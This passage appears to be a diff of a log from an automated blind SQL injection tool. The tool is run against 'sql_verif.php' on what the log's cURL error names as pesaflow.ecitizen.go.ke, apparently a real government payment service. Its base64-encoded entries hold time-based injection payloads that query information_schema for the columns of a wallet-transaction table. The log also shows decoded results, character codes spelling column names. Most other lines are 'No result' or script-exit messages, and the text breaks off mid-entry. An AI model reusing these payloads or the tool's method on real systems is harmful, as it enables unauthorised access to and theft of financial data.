+<br/>06:06:24<br/>Quering done!
+        
+    
+        
+[2023-05-25 06:08:02] No result<BR/>
+        
+    
+        
+[2023-05-25 06:08:41] {"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":2,"ttcm":"4","f":"C","pr":"ODI=","query":"eyJjaGFycG9zIjoyLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA2OjA2OjM1In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":3,"ttcm":"4","f":"C","pr":"ODItMTAx","query":"eyJjaGFycG9zIjozLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA2OjA2OjU1In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":4,"ttcm":"4","f":"C","pr":"ODItMTAxLTExOA==","query":"eyJjaGFycG9zIjo0LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA2OjA3OjIxIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":5,"ttcm":"4","f":"C","pr":"ODItMTAxLTExOC0xMDE=","query":"eyJjaGFycG9zIjo1LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA2OjA3OjM3In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":6,"ttcm":"4","f":"C","pr":"ODItMTAxLTExOC0xMDEtMTEw","query":"eyJjaGFycG9zIjo2LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA2OjA4OjAxIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":7,"ttcm":"4","f":"C","pr":"ODItMTAxLTExOC0xMDEtMTEwLTExNw==","query":"eyJjaGFycG9zIjo3LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjA2OjA4OjI0In0="}82-101-118-101-110-117-101
+<br/>06:08:41<br/>Quering done!
+        
+    
+        
+[2023-05-25 06:11:04] No result<BR/>
+        
+    
+        
+[2023-05-25 06:14:03] No result<BR/>
+        
+    
+        
+[2023-05-25 06:16:00] No result<BR/>
+        
+    
+        
+[2023-05-25 06:18:00] No result<BR/>
+        
+    
+        
+[2023-05-25 06:20:18] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 06:25:31] <BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 06:28:03] No result<BR/>
+        
+    
+        
+[2023-05-25 06:30:15] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 06:35:54] No result<BR/>
+        
+    
+        
+[2023-05-25 06:39:57] No result<BR/>
+        
+    
+        
+[2023-05-25 06:40:54] No result<BR/>
+        
+    
+        
+[2023-05-25 06:41:01] No result<BR/>
+        
+    
+        
+[2023-05-25 06:47:52] No result<BR/>
+        
+    
+        
+[2023-05-25 06:52:58] No result<BR/>
+        
+    
+        
+[2023-05-25 06:53:53] No result<BR/>
+        
+    
+        
+[2023-05-25 06:55:00] No result<BR/>
+        
+    
+        
+[2023-05-25 06:57:53] No result<BR/>
+        
+    
+        
+[2023-05-25 06:59:55] No result<BR/>
+        
+    
+        
+[2023-05-25 07:01:56] No result<BR/>
+        
+    
+        
+[2023-05-25 07:05:58] No result<BR/>
+        
+    
+        
+[2023-05-25 07:06:59] No result<BR/>
+        
+    
+        
+[2023-05-25 07:10:52] No result<BR/>
+        
+    
+        
+[2023-05-25 07:10:55] No result<BR/>
+        
+    
+        
+[2023-05-25 07:11:57] No result<BR/>
+        
+    
+        
+[2023-05-25 07:14:53] No result<BR/>
+        
+    
+        
+[2023-05-25 07:16:58] No result<BR/>
+        
+    
+        
+[2023-05-25 07:20:56] No result<BR/>
+        
+    
+        
+[2023-05-25 07:22:54] No result<BR/>
+        
+    
+        
+[2023-05-25 07:23:57] No result<BR/>
+        
+    
+        
+[2023-05-25 07:24:57] No result<BR/>
+        
+    
+        
+[2023-05-25 07:29:57] No result<BR/>
+        
+    
+        
+[2023-05-25 07:30:52] No result<BR/>
+        
+    
+        
+[2023-05-25 07:35:02] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 07:36:55] No result<BR/>
+        
+    
+        
+[2023-05-25 07:40:09] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 07:40:59] No result<BR/>
+        
+    
+        
+[2023-05-25 07:44:00] No result<BR/>
+        
+    
+        
+[2023-05-25 07:44:05] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 07:44:52] No result<BR/>
+        
+    
+        
+[2023-05-25 07:45:56] No result<BR/>
+        
+    
+        
+[2023-05-25 07:52:55] No result<BR/>
+        
+    
+        
+[2023-05-25 07:53:52] No result<BR/>
+        
+    
+        
+[2023-05-25 07:54:56] No result<BR/>
+        
+    
+        
+[2023-05-25 07:58:08] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 08:00:59] No result<BR/>
+        
+    
+        
+[2023-05-25 08:01:54] No result<BR/>
+        
+    
+        
+[2023-05-25 08:02:55] No result<BR/>
+        
+    
+        
+[2023-05-25 08:02:59] No result<BR/>
+        
+    
+        
+[2023-05-25 08:03:56] No result<BR/>
+        
+    
+        
+[2023-05-25 08:03:56] No result<BR/>
+        
+    
+        
+[2023-05-25 08:07:09] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 08:08:00] No result<BR/>
+        
+    
+        
+[2023-05-25 08:08:00] No result<BR/>
+        
+    
+        
+[2023-05-25 08:08:02] No result<BR/>
+        
+    
+        
+[2023-05-25 08:10:55] No result<BR/>
+        
+    
+        
+[2023-05-25 08:12:55] No result<BR/>
+        
+    
+        
+[2023-05-25 08:17:55] No result<BR/>
+        
+    
+        
+[2023-05-25 08:18:10] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 08:22:55] No result<BR/>
+        
+    
+        
+[2023-05-25 08:22:55] No result<BR/>
+        
+    
+        
+[2023-05-25 08:22:57] No result<BR/>
+        
+    
+        
+[2023-05-25 08:23:58] No result<BR/>
+        
+    
+        
+[2023-05-25 08:25:04] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 08:26:58] No result<BR/>
+        
+    
+        
+[2023-05-25 08:29:08] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 08:29:54] No result<BR/>
+        
+    
+        
+[2023-05-25 08:32:56] No result<BR/>
+        
+    
+        
+[2023-05-25 08:33:57] No result<BR/>
+        
+    
+        
+[2023-05-25 08:34:57] No result<BR/>
+        
+    
+        
+[2023-05-25 08:39:57] No result<BR/>
+        
+    
+        
+[2023-05-25 08:39:58] No result<BR/>
+        
+    
+        
+[2023-05-25 08:40:55] No result<BR/>
+        
+    
+        
+[2023-05-25 08:40:57] No result<BR/>
+        
+    
+        
+[2023-05-25 08:41:55] No result<BR/>
+        
+    
+        
+[2023-05-25 08:44:55] No result<BR/>
+        
+    
+        
+[2023-05-25 08:44:57] No result<BR/>
+        
+    
+        
+[2023-05-25 08:48:56] No result<BR/>
+        
+    
+        
+[2023-05-25 08:50:01] No result<BR/>
+        
+    
+        
+[2023-05-25 08:50:56] No result<BR/>
+        
+    
+        
+[2023-05-25 08:51:26] <BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 08:52:54] No result<BR/>
+        
+    
+        
+[2023-05-25 08:54:53] No result<BR/>
+        
+    
+        
+[2023-05-25 08:54:56] No result<BR/>
+        
+    
+        
+[2023-05-25 08:55:59] No result<BR/>
+        
+    
+        
+[2023-05-25 08:58:55] No result<BR/>
+        
+    
+        
+[2023-05-25 09:00:58] No result<BR/>
+        
+    
+        
+[2023-05-25 09:00:58] No result<BR/>
+        
+    
+        
+[2023-05-25 09:01:58] No result<BR/>
+        
+    
+        
+[2023-05-25 09:01:58] No result<BR/>
+        
+    
+        
+[2023-05-25 09:06:03] No result<BR/>
+        
+    
+        
+[2023-05-25 09:08:58] No result<BR/>
+        
+    
+        
+[2023-05-25 09:09:02] No result<BR/>
+        
+    
+        
+[2023-05-25 09:10:58] No result<BR/>
+        
+    
+        
+[2023-05-25 09:12:58] No result<BR/>
+        
+    
+        
+[2023-05-25 09:14:01] No result<BR/>
+        
+    
+        
+[2023-05-25 09:17:55] No result<BR/>
+        
+    
+        
+[2023-05-25 09:18:11] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 09:19:01] No result<BR/>
+        
+    
+        
+[2023-05-25 09:19:08] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 09:19:58] No result<BR/>
+        
+    
+        
+[2023-05-25 09:26:58] No result<BR/>
+        
+    
+        
+[2023-05-25 09:29:57] No result<BR/>
+        
+    
+        
+[2023-05-25 09:31:52] No result<BR/>
+        
+    
+        
+[2023-05-25 09:32:06] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 09:33:56] No result<BR/>
+        
+    
+        
+[2023-05-25 09:36:04] No result<BR/>
+        
+    
+        
+[2023-05-25 09:39:56] No result<BR/>
+        
+    
+        
+[2023-05-25 09:43:54] No result<BR/>
+        
+    
+        
+[2023-05-25 09:44:03] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 09:48:57] No result<BR/>
+        
+    
+        
+[2023-05-25 09:53:58] No result<BR/>
+        
+    
+        
+[2023-05-25 09:55:00] No result<BR/>
+        
+    
+        
+[2023-05-25 09:57:02] No result<BR/>
+        
+    
+        
+[2023-05-25 09:57:03] No result<BR/>
+        
+    
+        
+[2023-05-25 09:59:07] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 09:59:59] No result<BR/>
+        
+    
+        
+[2023-05-25 10:00:07] No result<BR/>
+        
+    
+        
+[2023-05-25 10:00:56] No result<BR/>
+        
+    
+        
+[2023-05-25 10:00:59] No result<BR/>
+        
+    
+        
+[2023-05-25 10:02:56] No result<BR/>
+        
+    
+        
+[2023-05-25 10:02:56] No result<BR/>
+        
+    
+        
+[2023-05-25 10:06:10] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 10:08:55] No result<BR/>
+        
+    
+        
+[2023-05-25 10:10:51] No result<BR/>
+        
+    
+        
+[2023-05-25 10:10:52] No result<BR/>
+        
+    
+        
+[2023-05-25 10:11:54] No result<BR/>
+        
+    
+        
+[2023-05-25 10:12:58] No result<BR/>
+        
+    
+        
+[2023-05-25 10:13:56] No result<BR/>
+        
+    
+        
+[2023-05-25 10:15:56] No result<BR/>
+        
+    
+        
+[2023-05-25 10:18:56] No result<BR/>
+        
+    
+        
+[2023-05-25 10:20:54] No result<BR/>
+        
+    
+        
+[2023-05-25 10:21:10] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 10:22:51] No result<BR/>
+        
+    
+        
+[2023-05-25 10:24:55] No result<BR/>
+        
+    
+        
+[2023-05-25 10:24:58] No result<BR/>
+        
+    
+        
+[2023-05-25 10:28:56] No result<BR/>
+        
+    
+        
+[2023-05-25 10:31:55] No result<BR/>
+        
+    
+        
+[2023-05-25 10:31:57] No result<BR/>
+        
+    
+        
+[2023-05-25 10:34:51] No result<BR/>
+        
+    
+        
+[2023-05-25 10:34:52] No result<BR/>
+        
+    
+        
+[2023-05-25 10:34:56] No result<BR/>
+        
+    
+        
+[2023-05-25 10:36:56] No result<BR/>
+        
+    
+        
+[2023-05-25 10:40:58] No result<BR/>
+        
+    
+        
+[2023-05-25 10:41:58] No result<BR/>
+        
+    
+        
+[2023-05-25 10:43:57] No result<BR/>
+        
+    
+        
+[2023-05-25 10:43:57] No result<BR/>
+        
+    
+        
+[2023-05-25 10:44:56] No result<BR/>
+        
+    
+        
+[2023-05-25 10:44:57] No result<BR/>
+        
+    
+        
+[2023-05-25 10:45:53] No result<BR/>
+        
+    
+        
+[2023-05-25 10:46:54] No result<BR/>
+        
+    
+        
+[2023-05-25 10:53:17] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 10:55:02] No result<BR/>
+        
+    
+        
+[2023-05-25 10:59:53] No result<BR/>
+        
+    
+        
+[2023-05-25 11:01:53] No result<BR/>
+        
+    
+        
+[2023-05-25 11:03:06] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 11:03:54] No result<BR/>
+        
+    
+        
+[2023-05-25 11:05:58] No result<BR/>
+        
+    
+        
+[2023-05-25 11:07:01] No result<BR/>
+        
+    
+        
+[2023-05-25 11:07:58] No result<BR/>
+        
+    
+        
+[2023-05-25 11:10:58] No result<BR/>
+        
+    
+        
+[2023-05-25 11:11:58] No result<BR/>
+        
+    
+        
+[2023-05-25 11:17:57] No result<BR/>
+        
+    
+        
+[2023-05-25 11:21:53] No result<BR/>
+        
+    
+        
+[2023-05-25 11:25:01] No result<BR/>
+        
+    
+        
+[2023-05-25 11:28:57] No result<BR/>
+        
+    
+        
+[2023-05-25 11:28:58] No result<BR/>
+        
+    
+        
+[2023-05-25 11:28:58] No result<BR/>
+        
+    
+        
+[2023-05-25 11:33:57] No result<BR/>
+        
+    
+        
+[2023-05-25 11:34:06] No result<BR/>
+        
+    
+        
+[2023-05-25 11:39:56] No result<BR/>
+        
+    
+        
+[2023-05-25 11:40:56] No result<BR/>
+        
+    
+        
+[2023-05-25 11:43:13] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 11:46:55] No result<BR/>
+        
+    
+        
+[2023-05-25 11:46:58] No result<BR/>
+        
+    
+        
+[2023-05-25 11:50:56] No result<BR/>
+        
+    
+        
+[2023-05-25 11:53:53] No result<BR/>
+        
+    
+        
+[2023-05-25 11:56:51] <BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 11:59:58] No result<BR/>
+        
+    
+        
+[2023-05-25 12:05:09] No result<BR/>The script touched exit!
+        
+    
+        
+[2023-05-25 12:09:52] No result<BR/>
+        
+    
+        
+[2023-05-25 12:11:54] No result<BR/>
+        
+    
+        
+[2023-05-25 12:12:59] No result<BR/>
+        
+    
+        
+[2023-05-25 12:51:12] {"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":2,"ttcm":"4","f":"C","pr":"ODI=","query":"eyJjaGFycG9zIjoyLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUwOjI4In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":3,"ttcm":"4","f":"C","pr":"ODItMTAx","query":"eyJjaGFycG9zIjozLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUwOjQ0In0="}cURL Error: Failed to connect to pesaflow.ecitizen.go.ke port 443 after 4518 ms: Timed out
+        
+    
+        
+[2023-05-25 12:54:32] {"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":4,"ttcm":"4","f":"C","pr":"MTE4","query":"eyJjaGFycG9zIjo0LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUzOjE2In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":5,"ttcm":"4","f":"C","pr":"MTE4LTEwMQ==","query":"eyJjaGFycG9zIjo1LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUzOjM0In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":6,"ttcm":"4","f":"C","pr":"MTE4LTEwMS0xMTA=","query":"eyJjaGFycG9zIjo2LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUzOjUzIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":7,"ttcm":"4","f":"C","pr":"MTE4LTEwMS0xMTAtMTE3","query":"eyJjaGFycG9zIjo3LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjU0OjE2In0="}118-101-110-117-101
+<br/>12:54:32<br/>Quering done!
+        
+    
+        
+[2023-05-25 12:54:50] {"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":4,"ttcm":"4","f":"C","pr":"MTE4","query":"eyJjaGFycG9zIjo0LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUzOjE2In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":5,"ttcm":"4","f":"C","pr":"MTE4LTEwMQ==","query":"eyJjaGFycG9zIjo1LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUzOjMzIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":6,"ttcm":"4","f":"C","pr":"MTE4LTEwMS0xMTA=","query":"eyJjaGFycG9zIjo2LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUzOjUyIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"4","lngth":7,"charpos":7,"ttcm":"4","f":"C","pr":"MTE4LTEwMS0xMTAtNDg=","query":"eyJjaGFycG9zIjo3LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAzKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjU0OjIyIn0="}118-101-110-48-48
+<br/>12:54:50<br/>Quering done!
+        
+    
+        
+[2023-05-25 12:54:59] {"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":2,"ttcm":"4","f":"C","pr":"NjU=","query":"eyJjaGFycG9zIjoyLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUwOjIwIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":3,"ttcm":"4","f":"C","pr":"NjUtMTEy","query":"eyJjaGFycG9zIjozLCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUwOjUzIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":4,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMg==","query":"eyJjaGFycG9zIjo0LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUxOjMwIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":5,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDg=","query":"eyJjaGFycG9zIjo1LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUyOjA1In0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":6,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1","query":"eyJjaGFycG9zIjo2LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUyOjIzIn0="}{"id":2,"page":"sql_verif.php","message":"VALID QUERY","tb":"74","cl":"2","lngth":12,"charpos":7,"ttcm":"4","f":"C","pr":"NjUtMTEyLTExMi0xMDgtMTA1LTk5","query":"eyJjaGFycG9zIjo3LCJwYXJhbSI6IihTRUxFQ1QoQ09MVU1OX05BTUUpRlJPTShpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucylXSEVSRSh0YWJsZV9zY2hlbWE9J3Blc2FmbG93J0FORCh0YWJsZV9uYW1lPSd2d3RvZGF5d2FsbGV0dHJ4JykpT1JERVIlMjBCWShDT0xVTU5fTkFNRSlMSU1JVCUyMDElMjBPRkZTRVQlMjAxKSIsInRhcmdldCI6MSwic2xlZXAiOjUsInNfdGltZSI6IjEyOjUyOjQwIn0="}{"id":2,"page":"sql_verif.php","message":"VALID 